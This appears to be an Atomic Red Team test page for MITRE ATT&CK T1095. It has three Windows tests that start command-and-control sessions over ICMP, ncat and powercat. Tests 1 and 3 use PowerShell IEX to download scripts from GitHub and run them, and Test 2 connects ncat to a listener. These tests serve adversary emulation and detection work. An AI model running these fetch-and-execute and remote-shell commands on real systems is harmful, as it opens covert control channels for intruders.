---
tags: [T1095, atomic_test]
filename: "[[T1095 - Non-Application Layer Protocol]]"
---
# T1095 - Non-Application Layer Protocol

## Atomic Test #1 - ICMP C2
This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener
refer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/

**Supported Platforms:** Windows


**auto_generated_guid:** 0268e63c-e244-42db-bef7-72a9e59fc1fc





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| server_ip | The IP address of the listening server | string | 127.0.0.1|


#### Attack Commands: Run with `powershell`! 


```powershell
IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
Invoke-PowerShellIcmp -IPAddress #{server_ip}
```






<br/>
<br/>

## Atomic Test #2 - Netcat C2
Start C2 Session Using Ncat
To start the listener on a Linux device, type the following: 
nc -l -p <port>

**Supported Platforms:** Windows


**auto_generated_guid:** bcf0d1c1-3f6a-4847-b1c9-7ed4ea321f37





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| server_port | The port for the C2 connection | integer | 80|
| ncat_exe | The location of ncat.exe | path | PathToAtomicsFolder&#92;..&#92;ExternalPayloads&#92;T1095&#92;nmap-7.80&#92;ncat.exe|
| ncat_path | The folder path of ncat.exe | path | PathToAtomicsFolder&#92;..&#92;ExternalPayloads&#92;T1095|
| server_ip | The IP address or domain name of the listening server | string | 127.0.0.1|


#### Attack Commands: Run with `powershell`! 


```powershell
cmd /c "#{ncat_exe}" #{server_ip} #{server_port}
```




#### Dependencies:  Run with `powershell`!
##### Description: ncat.exe must be available at specified location (#{ncat_exe})
##### Check Prereq Commands:
```powershell
if( Test-Path "#{ncat_exe}") {exit 0} else {exit 1}
```
##### Get Prereq Commands:
```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -ItemType Directory -Force -Path "#{ncat_path}" | Out-Null
$parentpath = Split-Path (Split-Path "#{ncat_exe}"); $zippath = "$parentpath\nmap.zip"
Invoke-WebRequest  "https://nmap.org/dist/nmap-7.80-win32.zip" -OutFile "$zippath"
  Expand-Archive $zippath $parentpath -Force
  $unzipPath = Join-Path $parentPath "nmap-7.80"
if( $null -eq (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | ?{$_.DisplayName -like "Microsoft Visual C++*"}) ) {
  Start-Process (Join-Path $unzipPath "vcredist_x86.exe")
}
```




<br/>
<br/>

## Atomic Test #3 - Powercat C2
Start C2 Session Using Powercat
To start the listener on a Linux device, type the following: 
nc -l -p <port>

**Supported Platforms:** Windows


**auto_generated_guid:** 3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| server_ip | The IP address or domain name of the listening server | string | 127.0.0.1|
| server_port | The port for the C2 connection | integer | 80|


#### Attack Commands: Run with `powershell`! 


```powershell
IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
powercat -c #{server_ip} -p #{server_port}
```






<br/>
